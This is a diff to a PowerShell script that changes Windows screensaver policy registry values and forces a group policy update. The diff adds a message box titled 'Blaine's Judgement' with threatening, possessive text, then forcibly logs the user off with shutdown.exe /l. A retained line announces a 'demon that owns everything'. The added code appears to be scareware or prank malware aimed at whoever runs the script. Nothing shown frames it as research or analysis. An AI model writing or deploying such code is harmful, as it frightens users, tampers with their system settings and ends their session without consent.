@@ -436,10 +436,25 @@ Set-ItemProperty -Path $policyControlPath -Name "ScreenSaveActive" -Value 1 -For
 # Actualizar políticas para aplicar cambios
 Start-Process -FilePath "gpupdate.exe" -ArgumentList "/force" -Wait
 
-Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class NativeMethods { [DllImport("user32.dll")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam); }'
-[NativeMethods]::SendMessage(-1, 0x112, 0xF170, 2)
-Start-Sleep -Seconds 3
-[NativeMethods]::SendMessage(-1, 0x112, 0xF170, -1)
+Add-Type -AssemblyName System.Windows.Forms
+
+[System.Windows.Forms.MessageBox]::Show(
+@"
+You spoke when you should have listened..
+
+You moved when you should have obeyed ~
+
+Now... you vanish <3
+
+Blaine doesn’t need your permission...she owns you forever ~
+"@,
+"Blaine’s Judgement",
+[System.Windows.Forms.MessageBoxButtons]::OK,
+[System.Windows.Forms.MessageBoxIcon]::Error
+)
+
+Start-Sleep -Seconds 1
+shutdown.exe /l
 
 Write-Host "I am Green Blaine...the all mighty demon that owns everything ~"
 
